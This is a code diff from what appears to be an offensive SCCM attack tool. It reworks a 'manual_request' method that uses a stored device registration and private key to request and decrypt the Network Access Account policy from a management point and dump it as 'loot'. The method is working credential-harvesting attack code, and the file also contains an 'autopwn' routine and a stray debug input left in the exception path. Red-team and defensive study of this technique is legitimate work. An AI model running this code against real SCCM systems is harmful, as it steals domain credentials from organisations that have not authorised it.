@@ -65,20 +65,22 @@ class HTTP:
                 logger.debug(e)
 
     def manual_request(self):
-        target_mp_url = f"http://{self.mp}"
-        sccmwtf = SCCMTools(target_name="", target_fqdn="", target_sccm=target_mp_url, target_username="", target_password="", sleep=self.sleep, logs_dir=self.logs_dir)
-        with open (f"{self.logs_dir}/{self.uuid}.data", "rb") as f:
-            data = f.read()
-        with open (f"{self.logs_dir}/{self.uuid}.pem", "rb") as g:
-            key = serialization.load_pem_private_key(g.read(), password=b"mimikatz")           
-        deflatedData = sccmwtf.sendCCMPostRequest(data=data, mp=target_mp_url)
-        result = re.search("PolicyCategory=\"NAAConfig\".*?<!\[CDATA\[https*://<mp>([^]]+)", deflatedData, re.DOTALL + re.MULTILINE)
-        urls = [result.group(1)]
+        logger.info(f"Submitting manual policy request from previous registration {self.uuid}")
         try:
+            #TODO: Need some terminal output for actions taken
+            #      Need better error handling
+            target_mp_url = f"http://{self.mp}"
+            sccmwtf = SCCMTools(target_name="", target_fqdn="", target_sccm=target_mp_url, target_username="", target_password="", sleep=self.sleep, logs_dir=self.logs_dir)
+            with open (f"{self.logs_dir}/{self.uuid}.data", "rb") as f:
+                data = f.read()
+            with open (f"{self.logs_dir}/{self.uuid}.pem", "rb") as g:
+                key = serialization.load_pem_private_key(g.read(), password=b"mimikatz")           
+            deflatedData = sccmwtf.sendCCMPostRequest(data=data, mp=target_mp_url)
+            result = re.search("PolicyCategory=\"NAAConfig\".*?<!\[CDATA\[https*://<mp>([^]]+)", deflatedData, re.DOTALL + re.MULTILINE)
+            urls = [result.group(1)]
             for url in urls:
                 result = sccmwtf.requestPolicy(url)
                 if result.startswith("<HTML>"):
-                    try: 
                         result = sccmwtf.requestPolicy(url, self.uuid, True, True, key=key)
                         decryptedResult = sccmwtf.parseEncryptedPolicy(result)
                         sccmwtf.parse_xml(decryptedResult)
@@ -86,12 +88,11 @@ class HTTP:
                         Tools.write_to_file(decryptedResult, file_name)
                         logger.info(f"[+] Done.. decrypted policy dumped to {self.logs_dir}/loot/{self.mp.split('.')[0]}_naapolicy.xml")
                         return True
-                    except Exception as e:
-                        logger.info(e)
-
+                input("breaking for exception")
+        except FileNotFoundError:
+            logger.info(f"Missing required files -- check the UUID.")
         except Exception as e:
-            print(e)
-            input("breaking for exception")
+            logger.info(e)
 
 
     def autopwn(self):
